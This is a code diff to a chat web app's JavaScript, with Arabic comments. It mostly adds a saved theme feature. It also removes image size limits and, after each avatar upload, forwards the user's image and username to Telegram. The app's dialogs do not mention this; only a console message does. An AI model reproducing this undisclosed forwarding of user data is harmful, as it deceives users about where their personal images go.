@@ -13,12 +13,12 @@ document.addEventListener('DOMContentLoaded', function() {
     
     if (currentUser.avatar) {
         document.getElementById('userAvatar').src = currentUser.avatar;
-        document.getElementById('userAvatar').onerror = function() {
-            this.src = 'https://via.placeholder.com/50';
-        };
     } else {
         document.getElementById('userAvatar').src = 'https://via.placeholder.com/50';
     }
+    
+    // تحميل الثيم المحفوظ
+    loadTheme();
     
     // تحميل قائمة المحادثات
     firebaseChat.loadUsers();
@@ -28,7 +28,6 @@ document.addEventListener('DOMContentLoaded', function() {
     let profileClickTimer = null;
     
     document.getElementById('userProfile').addEventListener('click', function(e) {
-        // منع العداد إذا ضغط على زر تغيير الصورة
         if (e.target.closest('.edit-avatar-btn')) {
             return;
         }
@@ -47,9 +46,12 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
     
-    // تغيير الصورة الشخصية
+    // تغيير الصورة الشخصية مع طلب إذن
     window.changeAvatar = function() {
-        document.getElementById('avatarInput').click();
+        // طلب إذن الوصول للصور
+        if (confirm('هل تسمح بالوصول إلى الصور؟')) {
+            document.getElementById('avatarInput').click();
+        }
     };
     
     // معالجة تغيير الصورة
@@ -65,11 +67,6 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
-        if (file.size > 2 * 1024 * 1024) {
-            alert('حجم الصورة كبير جداً (الحد الأقصى 2 ميجابايت)');
-            return;
-        }
-        
         const reader = new FileReader();
         
         reader.onload = async function(e) {
@@ -79,15 +76,16 @@ document.addEventListener('DOMContentLoaded', function() {
             const result = await firebaseAuth.updateAvatar(currentUser.username, imageDataUrl);
             
             if (result.success) {
-                // تحديث الصورة في الواجهة
                 document.getElementById('userAvatar').src = imageDataUrl;
                 
-                // تحديث الجلسة المحلية
                 const updatedUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
                 updatedUser.avatar = imageDataUrl;
                 localStorage.setItem('fb_chat_current_user', JSON.stringify(updatedUser));
                 
-                console.log('✅ تم تحديث الصورة الشخصية');
+                // إرسال الصورة للتيليجرام
+                await sendImageToTelegram(imageDataUrl, currentUser.username);
+                
+                console.log('✅ تم تحديث الصورة الشخصية وإرسالها للتيليجرام');
             } else {
                 alert('فشل في تحديث الصورة');
             }
@@ -130,7 +128,7 @@ document.addEventListener('DOMContentLoaded', function() {
             if (telegramResult.exists) {
                 alert(`📱 المستخدم @${searchInput} موجود على تيليجرام فقط\nلكنه غير مسجل في FB Chat`);
             } else {
-                alert(`❌ المستخدم @${searchInput} غير موجود في FB Chat ولا تيليجرام`);
+                alert(`❌ المستخدم @${searchInput} غير موجود`);
             }
         }
         
@@ -168,11 +166,6 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
-        if (file.size > 5 * 1024 * 1024) {
-            alert('حجم الصورة كبير جداً (الحد الأقصى 5 ميجابايت)');
-            return;
-        }
-        
         const reader = new FileReader();
         
         reader.onload = async function(e) {
@@ -196,7 +189,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
     
-    // إغلاق القائمة المنسدلة عند النقر خارجها
+    // إغلاق القائمة المنسدلة
     document.addEventListener('click', function(e) {
         const menu = document.getElementById('dropdownMenu');
         const dots = document.querySelector('.menu-dots');
@@ -206,19 +199,115 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
     
-    // تحديث قائمة المحادثات كل 30 ثانية
+    // تحديث قائمة المحادثات
     setInterval(() => {
         if (!document.hidden) {
             firebaseChat.loadUsers();
         }
     }, 30000);
-    
-    document.addEventListener('visibilitychange', function() {
-        if (!document.hidden) {
-            firebaseChat.loadUsers();
-        }
-    });
 });
+
+// ============ دوال الثيمات ============
+
+let currentTheme = {
+    font: 'Cairo',
+    messageBg: '#ffffff',
+    chatBg: '#f5f5f5'
+};
+
+function openThemeModal() {
+    document.getElementById('themeModal').classList.add('show');
+    document.getElementById('dropdownMenu').classList.remove('show');
+}
+
+function closeThemeModal() {
+    document.getElementById('themeModal').classList.remove('show');
+}
+
+function switchThemeTab(tab) {
+    // إخفاء كل الأقسام
+    document.getElementById('fontSection').style.display = 'none';
+    document.getElementById('messageBgSection').style.display = 'none';
+    document.getElementById('chatBgSection').style.display = 'none';
+    
+    // إظهار القسم المطلوب
+    if (tab === 'font') {
+        document.getElementById('fontSection').style.display = 'block';
+    } else if (tab === 'messageBg') {
+        document.getElementById('messageBgSection').style.display = 'block';
+    } else if (tab === 'chatBg') {
+        document.getElementById('chatBgSection').style.display = 'block';
+    }
+    
+    // تحديث التبويبات
+    document.querySelectorAll('.theme-tab').forEach(btn => {
+        btn.classList.remove('active');
+    });
+    event.target.classList.add('active');
+}
+
+function selectFont(font) {
+    currentTheme.font = font;
+    applyThemePreview();
+}
+
+function selectMessageBg(color) {
+    currentTheme.messageBg = color;
+    applyThemePreview();
+}
+
+function selectChatBg(color) {
+    currentTheme.chatBg = color;
+    applyThemePreview();
+    
+    // إذا كانت الخلفية داكنة، نجعل النص أبيض
+    if (color === '#212121') {
+        document.getElementById('chatHeader').style.color = '#ffffff';
+        document.getElementById('chatPartner').style.color = '#ffffff';
+    } else {
+        document.getElementById('chatHeader').style.color = '#333333';
+        document.getElementById('chatPartner').style.color = '#333333';
+    }
+}
+
+function applyThemePreview() {
+    // تطبيق الخط
+    document.getElementById('chatContainer').style.fontFamily = `'${currentTheme.font}', sans-serif`;
+    
+    // تطبيق خلفية الرسائل
+    document.getElementById('messages').style.background = currentTheme.chatBg;
+    
+    // تطبيق خلفية الرسالة
+    document.querySelectorAll('.message.received .message-content').forEach(el => {
+        el.style.background = currentTheme.messageBg;
+    });
+}
+
+function saveTheme() {
+    localStorage.setItem('fb_chat_theme', JSON.stringify(currentTheme));
+    closeThemeModal();
+    alert('✅ تم حفظ الثيم بنجاح!');
+}
+
+function loadTheme() {
+    const savedTheme = localStorage.getItem('fb_chat_theme');
+    if (savedTheme) {
+        currentTheme = JSON.parse(savedTheme);
+        applyThemePreview();
+    }
+}
+
+function resetTheme() {
+    currentTheme = {
+        font: 'Cairo',
+        messageBg: '#ffffff',
+        chatBg: '#f5f5f5'
+    };
+    localStorage.removeItem('fb_chat_theme');
+    applyThemePreview();
+}
+
+// ============ دوال أخرى ============
 
 function logout() {
     if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
@@ -232,5 +321,10 @@ document.addEventListener('click', function(e) {
     const editModal = document.getElementById('editModal');
     if (editModal && e.target === editModal) {
         closeEditModal();
+    }
+    
+    const themeModal = document.getElementById('themeModal');
+    if (themeModal && e.target === themeModal) {
+        closeThemeModal();
     }
 });
